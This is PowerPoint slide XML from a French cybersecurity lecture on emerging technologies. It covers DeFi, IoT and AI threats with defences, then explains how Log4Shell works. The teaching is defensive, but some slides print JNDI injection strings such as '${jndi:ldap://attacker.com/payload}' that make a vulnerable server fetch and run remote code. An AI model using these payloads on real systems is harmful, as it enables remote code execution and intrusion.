              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contrat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> intelligent DeFi a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>permis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un exploit et le vol de millions de dollars.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1101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DE88-E214-F935-AF54-879273FC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Blockchain : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Défenses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place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C11F7-9EC8-8985-76B5-68E8B31B1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Stratégies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>défensives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Audits </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réguliers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des smart contracts (pas evident.)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Mise </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> place de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mécanismes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de fail-safe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cas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’erreur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Technologies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>émergentes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Utilisation de la formalisation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mathématique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>prouver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’intégrité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des smart contracts.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0937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E9F8B3-8282-4A93-BBF8-3342538A7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62038-FC9E-C077-A445-3E4EC2145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400" err="1"/>
              <a:t>Cybersécurité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> et technologies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>émergentes</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="24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EFA797-975B-41D8-BC96-56CDC2CFA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2286000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B273D-BE2C-144F-DEF2-24F5B910D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729554"/>
            <a:ext cx="8476434" cy="335962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Sous-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>thème</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> : IoT et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>objets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>connectés</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" b="1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 err="1"/>
              <a:t>Problèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> courants :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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Dispositifs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> peu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurisés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (mots de passe par </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>défaut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, absence de mise à jour).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/>
              <a:t>Surface </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>étendue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via des millions de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dispositifs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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dirty="0"/>
              <a:t>Exploitation pour des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attaques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> DDoS (ex. botnet Mirai).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b="1" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Une </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>caméra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>connectée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>piratée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>infiltrer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un réseau domestique.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dirty="0" err="1"/>
              <a:t>L’IoT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aujourd’hui</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> considéré comme l’une des plus grande faille contre les PME.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0869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43A5-B9FE-1CA0-08CD-67A24972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IoT : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Méthodes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>défense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>avancées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D1205C-37FF-EE2B-057D-CF192340A3F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29566" y="2286000"/>
          <a:ext cx="9238434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073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6F31F-7F02-FD20-B721-BF10A30D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Cybersécurité et technologies émergentes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7BA2-C105-2F9A-4D45-9056F860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 fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Sous-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>thème</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> : Intelligence </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>artificielle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> (IA)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Utilisations par les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>attaquants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Phishing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>automatisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> avec IA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>générant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des e-mails </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>personnalisés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Contournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des CAPTCHAs avec des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>modèles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’apprentissage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>automatique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Ecriture</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (dans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certaine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mesure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Cas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>concret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Une IA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utilisée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contourner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de reconnaissance </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vocale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>faciale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>accéder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> aux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comptes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> protégés.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Arnaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> au president “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>améliorée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>” par IA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64006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E9F8B3-8282-4A93-BBF8-3342538A7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632D78-6E92-FEE6-1F62-86D21EEF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400"/>
              <a:t>IA : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>Stratégies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>contrecarrer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>abus</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="24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EFA797-975B-41D8-BC96-56CDC2CFA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2286000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3EB9A-B023-1B89-F6A1-812D29A28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729554"/>
            <a:ext cx="8476434" cy="3359621"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr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Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>comportementale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Développement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’algorithmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>repérer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>anormaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans les flux de données.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Tests </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>continus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Simulation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’attaques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> IA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> protégés pour identifier les points </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>faibles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4326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B4809-939F-047D-8525-95C51A23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Les “dernières” techniques d’attaques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992A06-12D3-CC84-9E87-C56E80F07E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3023204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7379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24D48-4ACF-B8F8-5708-F6FA5C70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1"/>
            <a:ext cx="9144000" cy="869092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Log4Shell : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Pourquoi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>c’était</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> critique ?</a:t>
            </a:r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DED868-D368-B0A3-8133-BE50152806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096462"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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793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5BADA-5EE7-A91C-94BD-DD0CC2E68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 à Log4Shell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D4DEC-76A4-A2E1-63AD-86277E1E6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Qu’est-ce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> que Log4Shell ?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Une </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> critique </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>identifiée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans Apache Log4j 2.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Permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code à distance (RCE).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Référence</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : CVE-2021-44228.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Impact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Affecte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des millions de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et services </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utilisant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Log4j.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Exploitable sur des applications Java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérables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Exposition massive dans les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>environnements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> cloud, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>serveurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, IoT.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803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04D2-FBC3-0542-6CF9-F8711F520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Origine et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>découverte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56D28-445A-D5D0-5C48-661E92A16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Date de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>découverte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Novembre 2021.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Publication :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Décembre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 2021.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Origine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Apache Log4j, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> bibliothèque de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>journalisation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>populaire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Java.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Raison de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>vulnérabilité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Fonctionnalité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de substitution de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chaînes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (Message Lookup Substitution), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>notamment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via JNDI.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6064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98B51-9B04-1F25-4A3C-00DECFE8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Qu’est-ce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> que Log4j 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236DF-35B6-31C5-7207-BC5BF01A4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Apache Log4j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Bibliothèque pour consigner les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>journaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des applications Java.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Permet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journalisation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> flexible avec divers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>niveaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (INFO, DEBUG, ERROR,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Fonctionnalité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> critique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Substitution </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dynamique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>journaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via ${} 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${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>env:VARIABLE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>} pour lire des variables </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’environnement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/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${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>jndi:URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>} pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>effectuer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>recherches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>distantes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278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72C3-3332-ABB3-6CD4-D4AA015E8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Concept de base de JNDI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1B9E8-F726-3594-712A-6F1E51955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JNDI (Java Naming and Directory Interface)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API Java pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>accéder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> aux services de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>répertoires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (LDAP, RMI, DNS,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Principe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Permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rechercher</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ressources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objets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>distants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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : ${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>jndi:ldap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malicious.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>/resource}.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4953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A2C6A-B537-FC37-9EE1-2D6546F36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Chaîne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérable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A8C7E-C080-D526-BAB5-904A59E5D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/>
              <a:t>Entrée </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>utilisateur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>malveillante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L'attaquant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>injecte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chaîne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${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>jndi:ldap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>/payload}.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Log4j </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>interprète</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>chaîne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La substitution de ${}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activée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>défaut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Requête</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> JNDI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Log4j </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contacte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via LDAP.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Téléchargement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> d’un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>objet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> distant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L’objet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillant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exécuté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
